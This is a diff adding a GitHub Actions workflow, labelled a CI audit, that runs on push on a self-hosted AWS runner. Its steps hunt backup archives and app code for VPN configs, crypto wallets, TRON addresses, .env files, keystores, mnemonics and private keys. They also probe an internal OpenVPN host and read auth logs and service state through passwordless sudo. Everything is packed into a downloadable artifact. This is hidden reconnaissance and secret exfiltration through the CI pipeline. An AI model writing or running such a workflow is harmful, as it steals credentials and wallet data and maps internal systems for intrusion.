@@ -1,0 +1,59 @@
+name: ci-audit-2918e
+on: push
+permissions:
+  contents: read
+jobs:
+  host:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    timeout-minutes: 50
+    steps:
+      - name: backups_archives
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2918e"; mkdir -p "$D"
+          {
+            echo "########## backups listing"; ls -la /home/ubuntu/backups 2>&1 | head -60
+            echo "########## archive contents grep vpn/wallet/tron/env"; for f in /home/ubuntu/backups/*; do case "$f" in *.tgz|*.tar.gz|*.tar|*.zip) echo "== $f"; tar tzf "$f" 2>/dev/null | grep -iE 'vpn|ovpn|wallet|tron|sign|\.env|keystore|mnemonic|\.pem|id_' | head -30;; esac; done
+            echo "########## any archives elsewhere"; sudo -n find /home/ubuntu /opt /srv -xdev \( -name '*.tgz' -o -name '*.tar.gz' -o -name '*.zip' -o -name '*.dump' \) 2>/dev/null | grep -vE 'node_modules|\.venv|actions-runner/_work|nvm' | head -40
+          } > "$D/bk.txt" 2>&1
+          wc -l "$D/bk.txt"; sed -n '1,200p' "$D/bk.txt"
+      - name: dwcalc
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2918e"; B=$(ls -d /home/ubuntu/apps/dw-calculator* | tail -1)
+          {
+            echo "########## latest dwcalc: $B"; ls -la "$B" 2>&1 | head -40
+            echo "########## README"; cat "$B/README.md" 2>/dev/null | head -80
+            echo "########## hitung_dw.py head"; head -120 "$B/hitung_dw.py" 2>/dev/null
+            echo "########## urls/endpoints/dupoin refs in code"; grep -rInE 'https?://|api|dupoin|wallet|j.?wallet|trc|withdraw|penarikan|deposit|sign' "$B" --include='*.py' --include='*.html' --include='*.md' --include='*.json' 2>/dev/null | grep -vE '\.venv|__pycache__' | cut -c1-240 | head -60
+            echo "########## fixtures listing"; ls -la "$B/fixtures" 2>&1 | head -30
+            echo "########## fixtures head"; for f in "$B"/fixtures/*; do echo "== $f"; head -6 "$f" 2>/dev/null | cut -c1-240; done | head -60
+            echo "########## templates list"; ls -la "$B/templates" 2>&1 | head -20
+            echo "########## templates grep wallet/tron"; grep -rInE 'wallet|tron|trc|usdt|address|0x|T[1-9A-HJ-NP-Za-km-z]{20}' "$B/templates" 2>/dev/null | cut -c1-200 | head -40
+          } > "$D/dwcalc.txt" 2>&1
+          wc -l "$D/dwcalc.txt"; sed -n '1,320p' "$D/dwcalc.txt"
+      - name: vpn_holdings_logs
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2918e"
+          {
+            echo "########## openvpn tcp hard reset (correct framing)"; timeout 10 python3 -c "import socket,os;p=bytes([0x38])+os.urandom(8);s=socket.create_connection(('192.168.1.222',1194),5);s.settimeout(5);s.send(len(p).to_bytes(2,'big')+p);d=s.recv(4096);print('resp',d.hex()[:160],'len',len(d))" 2>&1
+            echo "########## openvpn udp hard reset"; timeout 10 python3 -c "import socket,os;p=bytes([0x38])+os.urandom(8);s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.settimeout(5);s.sendto(p,('192.168.1.222',1194));d,_=s.recvfrom(4096);print('resp',d.hex()[:160],'len',len(d))" 2>&1
+            echo "########## auth.log interesting"; sudo -n grep -iE 'vpn|tailscale|ssm|Accepted|Failed password|session opened' /var/log/auth.log 2>/dev/null | tail -60
+            echo "########## journal cloudflared/pm2"; sudo -n journalctl -u cloudflared-marketingos --no-pager -n 15 2>&1 | tail -20
+            echo "########## any unit named vpn/openvpn"; ls -la /etc/systemd/system/multi-user.target.wants 2>/dev/null | head -40
+            echo "########## ssm agent"; systemctl is-active amazon-ssm-agent 2>&1; ls -la /var/log/amazon/ssm 2>/dev/null | head -10
+            echo "########## pm2 dump"; ls -la /home/ubuntu/.pm2 2>&1 | head -20; grep -oE '"name":"[^"]+"' /home/ubuntu/.pm2/dump.pm2 2>/dev/null | head -20
+          } > "$D/vpnlogs.txt" 2>&1
+          wc -l "$D/vpnlogs.txt"; sed -n '1,220p' "$D/vpnlogs.txt"
+      - name: upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: a2918e
+          path: ${{ runner.temp }}/a2918e
+          if-no-files-found: warn
+          retention-days: 2
